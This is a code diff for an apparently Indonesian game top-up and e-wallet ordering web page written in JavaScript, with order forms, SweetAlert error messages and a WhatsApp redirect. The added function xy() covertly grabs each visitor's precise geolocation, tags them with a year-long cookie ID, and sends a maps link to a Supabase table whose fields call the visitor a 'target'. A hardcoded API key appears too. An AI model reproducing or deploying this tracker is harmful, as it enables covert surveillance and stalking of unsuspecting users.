+      if (["FREE FIRE MAX", "MINI WORLD CREATA", "BLOCKMAN GO", "MOBILE LEGENDS", "GENSHIN IMPACT", "BLOOD STRIKE", "FC MOBILE"].includes(inc)) {
+      document.getElementById('peringatan_k').style.display = "grid";
+      if (!document.getElementById('setuju').checked) {
+        document.getElementById('b_stj').style.backgroundColor='#102C0A';
+      } else {
+        document.getElementById('b_stj').style.backgroundColor='#43B72B';
+      }
+      dataPayment = [topupX[0], topupX[1], topupX[2], topupX[3], topupX[4], range_to];
+      /*data_ascii = "code user information ASCII:[" + `<event-data-locked!^password_data="AsciiKeyUnlockedRWZA"^/untuk top-up!/by_host:rawizaad?nama:${name}&pass_user:${idlistname[name.toUpperCase()]}&kode_top-up:${dataPayment[0]}&harga:${dataPayment[1].toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00&total_harga:${kattot.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00&jumlah:${dataPayment[5]}x&uid:${uid}&top-up:${dataPayment[2]}/ASCII=^memastikan_kode tersebut_benar:[${name}|${idlistname[name.toUpperCase()]}|${dataPayment[0]}|${dataPayment[1].toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00|${kattot.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00|${dataPayment[5]}|${uid}|${dataPayment[2]}]^/save-data>`.split('').map(char => char.charCodeAt(0)).join(' ') + "]!";*/
+        data_event = `
+        .
+         - RAWIZAAD_768 saya ingin top-up: ${dataPayment[2]}
+          1. Nama: ${name}
+          2. Code UID: ${uid}
+          3. Kode top-up: ${dataPayment[0]}
+          4. Harga per unit: Rp. ${dataPayment[1].toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00
+          5. Jumlah: ${dataPayment[5]}x
+          6. Total harga: Rp. ${kattot.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00
+          ${(inc !== "GENSHIN IMPACT") ? "" : `7. Server id: ${server_id}`}
+          `;
+    } else if (["GOPAY", "BANK LAIN", "OVO", "SHOPEE", "SEA BANK", "DANA"].includes(inc)) {
+      hasilkalitot = Number(saldo_to) + Number(pajak) + ((saldo_to >= 1000) ? Number(document.getElementById('out_1').value.split(",")[5]) : 0);
+      const ex = document.getElementById('out_1').value.split(",");
+      document.getElementById('peringatan_k').style.display = "grid";
+       dataPayment = [[saldo_to, pajak, ex[5]],ex[0] , ex[2], 0, hasilkalitot, range_to];
+      const saldoParts = dataPayment[0].map(n =>
+  n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".") + ";00"
+);
+const saldoString = saldoParts.join("+");
+//const code_T = (inc === "DANA") ? "JMTFS" :  ;
+/*data_ascii = "code user information ASCII:[" + `<event-data-locked!^password_data="AsciiKeyUnlockedRWZA"^/untuk top-up!/by_host:rawizaad?nama:${name}&pass_user:${idlistname[name.toUpperCase()]}&kode_top-up:${dataPayment[1] + saldo_to}&pajak(saldo+2pajak):${saldoString}&total_harga:${dataPayment[4].toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00&jumlah:${dataPayment[5]}x&uid:${uid}&top-up:${dataPayment[2]}/ASCII=^memastikan_kode tersebut_benar:[${name}|${idlistname[name.toUpperCase()]}|${dataPayment[1] + saldo_to}|${saldoString}|${dataPayment[4].toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00|${dataPayment[5]}|${uid}|${dataPayment[2]}]^/save-data>`.split('').map(char => char.charCodeAt(0)).join(' ') + "]!";*/
+        data_event = `
+        .
+         - RAWIZAAD_768 saya ingin top-up: ${dataPayment[2]}
+          1. Nama: ${name}
+          2. Code nomor: ${uid}
+          3. Top-up: JMTFS${saldo_to}
+          4. Pajak(saldo+2pajak): Rp. ${saldoString}
+          5. Jumlah: ${dataPayment[5]}x
+          6. Total harga: Rp. ${dataPayment[4].toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".")};00`;
+    } else {
+      
+    }} else {
+      kesempatan3++;
+      document.getElementById('nama').hidden = false;
+      document.getElementById('uid').hidden = false;
+      Swal.fire({
+        title: 'NAMA KAMU TIDAK DALAM LIST!',
+        html: `Kamu mempunyai <font color="red">${kesempatan3}x/3x</font> kesempatan untuk menggantinya!`,
+        icon: 'error',
+        confirmButtonText: 'Ya!',
+        width: '85vw',
+        padding: '0 0 3vw 0'
+      })
+      if (kesempatan3 === 3) { setTimeout(() => {
+        window.close();
+      }, 1000);
+    }}} else {
+      document.getElementById('nama').hidden = false;
+      document.getElementById('uid').hidden = false;
+    }});
+  } else {
+    if (["FREE FIRE MAX", "MINI WORLD CREATA", "BLOCKMAN GO", "BLOOD STRIKE", "FC MOBILE"].includes(inc)) {
+    Swal.fire({
+        title: "KESALAHAN MENGISI!",
+        html: `<font color="#CA662D">Coba anda cek di baigain id game kamu!</font> <br> karena kami mendeteksi kesalahan pengisian di bagian id yang kamu isi!`,
+        icon: "error"
+      });
+    } else if (["MOBILE LEGENDS", "GENSHIN IMPACT"].includes(inc)) {
+      Swal.fire({
+        title: "KESALAHAN MENGISI!",
+        html: `Mungkin id server atau zona anda belum masukan? <br> <font color="#CA662D">Coba anda cek di baigain id game kamu!</font> <br> karena kami mendeteksi kesalahan pengisian di bagian id yang kamu isi!`,
+        icon: "error"
+      });
+    } else if (["GOPAY", "BANK LAIN", "OVO", "SHOPEE", "SEA BANK", "DANA"].includes(inc)) {
+      Swal.fire({
+        title: "KESALAHAN MENGISI!",
+        html: `<font color="red">karena Nomor saldo anda bukan bagian dari nomor hp!</font> <br> <font color="#CA662D">Coba anda cek di baigain Nomor saldo kamu!</font> <br> karena kami mendeteksi kesalahan pengisian di bagian Nomor saldo yang kamu isi!`,
+        icon: "error"
+      });
+    }
+  }}
+}
+
+function detec(teks) {
+  for (let i = 0; i < teks.length; i++) {
+    let karakter = teks[i];
+    if (isNaN(parseInt(karakter))) {
+      return true;
+    }
+  }
+  return false;
+}
+
+function go_submit() {
+  document.getElementById('nama').hidden = false;
+  document.getElementById('uid').hidden = false;
+    document.getElementById('nama').disabled = true;
+    document.getElementById('uid').disabled = true;
+    document.querySelectorAll('[name="server"]').forEach(e => {
+          e.disabled = true;
+        });
+      Swal.fire({
+        title: "Selesai!",
+        html: `<font color="green">Permintaan anda akan segera di buat!</font> <br> 🥳🥳🥳`,
+        icon: "success"
+      });
+        setTimeout(() => {
+            const whatsappLink = `https://wa.me/6287762394257?text=${encodeURIComponent(data_ascii) + encodeURIComponent(data_event)}`;
+            window.location.replace(whatsappLink, '_blank');
+        }, 1000);
+}
+
+
+function xy() {
+    // Konfigurasi Supabase
+    const supabaseUrl = 'https://sptqcxywtddunlhytvav.supabase.co';
+    const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNwdHFjeHl3dGRkdW5saHl0dmF2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDUxMjU3ODIsImV4cCI6MjA2MDcwMTc4Mn0.9izMaAzz1jaorddcMNWOcfQ5Opjm-Qk_D5ps97LHmxM';
+    const tableName = 'locationx';
+    const maxLocationAttempts = 3;
+    let locationAttempts = 0;
+    let locationDataToSend = null;
+
+    async function supabaseFetch(url, options) {
+        const response = await fetch(url, {
+            ...options,
+            headers: {
+                ...options?.headers,
+                'apikey': supabaseAnonKey,
+                'Authorization': `Bearer ${supabaseAnonKey}`,
+            },
+        });
+        console.log('Supabase Fetch Response:', response); // Log seluruh response
+
+        if (!response.ok) {
+            let errorData;
+            try {
+                errorData = await response.json();
+            } catch (jsonError) {
+                console.error('Error parsing JSON error response:', jsonError, response);
+                throw new Error(`Gagal membaca respons error: ${response.statusText}`);
+            }
+            console.error('Supabase Fetch Error Data:', errorData);
+            throw new Error(`Gagal: ${errorData?.message || response.statusText}`);
+        }
+
+        // Coba mengurai JSON hanya jika ada body respons
+        const contentLength = response.headers.get('content-length');
+        if (contentLength !== null && contentLength !== '0') {
+            try {
+                const data = await response.json();
+                return data;
+            } catch (jsonError) {
+                console.error('JSON Parsing Error (OK Response):', jsonError, response);
+                throw new Error(`Gagal mengurai respons JSON yang berhasil: ${jsonError.message || response.statusText}`);
+            }
+        } else {
+            return null; // Tidak ada body respons untuk diurai
+        }
+    }
+
+    // Fungsi untuk mengirim data lokasi ke Supabase
+    async function kirimLokasi(id, latitude, longitude) {
+        const mapsUrl = `http://maps.google.com/?q=${latitude},${longitude}`;
+        const locationData = { ip_target: id, location_target: mapsUrl, name: namexy }; // Nama disesuaikan
+        try {
+            const responseData = await supabaseFetch(`${supabaseUrl}/rest/v1/${tableName}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(locationData),
+            });
+            console.log('Data lokasi berhasil dikirim:', responseData);
+            // document.getElementById('pesan').textContent = 'Data lokasi berhasil dikirim.';
+            // document.getElementById('pesan').className = 'sukses';
+        } catch (error) {
+            console.error('Gagal mengirim data lokasi:', error);
+            // document.getElementById('pesan').textContent = `Gagal mengirim data lokasi: ${error.message}`;
+            // document.getElementById('pesan').className = 'error';
+        } finally {
+            // Setelah mencoba mengirim (berhasil atau gagal), set kembali agar tidak mencoba lagi
+            locationDataToSend = null;
+        }
+    }
+
+    // Fungsi untuk menghasilkan ID acak (tetap ada, tapi hanya digunakan sekali di awal)
+    
+
+    // Fungsi untuk mendapatkan lokasi dengan percobaan ulang
+    function getLocationWithRetry(id) {
+        function handlePosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const mapsUrl = `http://maps.google.com/?q=${latitude},${longitude}`;
+
+            console.log("Lokasi berhasil didapatkan:", latitude, longitude);
+            locationDataToSend = { latitude, longitude, mapsUrl };
+            // Kirim lokasi hanya sekali setelah berhasil didapatkan
+            kirimLokasi(id, latitude, longitude);
+        }
+
+        function handleError(error) {
+            locationAttempts++;
+            console.log(`Percobaan mendapatkan lokasi ke-${locationAttempts} gagal:`, error.message);
+            if (locationAttempts < maxLocationAttempts) {
+                console.log("Mencoba mendapatkan lokasi lagi...");
+                setTimeout(getLocation, 2000); // Coba lagi setelah 2 detik
+            } else {
+                console.error("Gagal mendapatkan lokasi setelah beberapa percobaan.");
+
+            }
+        }
+
+        navigator.geolocation.getCurrentPosition(handlePosition, handleError, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+    }
+
+
+    const storedId = getCookie('uniqueId');
+    let currentId;
+
+    if (storedId) {
+        currentId = storedId;
+        console.log("ID ditemukan di cookie:", currentId);
+    } else {
+        currentId = getRandomId();
+        setCookie('uniqueId', currentId, 365); // Simpan selama 365 hari
+        console.log("ID baru dibuat dan disimpan:", currentId);
+    }
+
+    
+    getLocationWithRetry(currentId);
+
+function setCookie(name, value, days) {
+    const date = new Date();
+    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+    const expires = "expires=" + date.toUTCString();
+    document.cookie = name + "=" + value + ";" + expires + ";path=/";
+}
+
+
+function getCookie(name) {
+    const cookieName = name + "=";
+    const decodedCookie = decodeURIComponent(document.cookie);
+    const cookieArray = decodedCookie.split(';');
+    for(let i = 0; i < cookieArray.length; i++) {
+        let cookie = cookieArray[i];
+        while (cookie.charAt(0) === ' ') {
+            cookie = cookie.substring(1);
+        }
+        if (cookie.indexOf(cookieName) === 0) {
+            return cookie.substring(cookieName.length, cookie.length);
+        }
+    }
+    return "";
+}
+
+// Jalankan fungsi xy() ketika halaman dimuat (atau sesuai kebutuhan Anda)
+function getRandomId() {
+        return Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
+    }
+</script>
+</body>
+    </html>
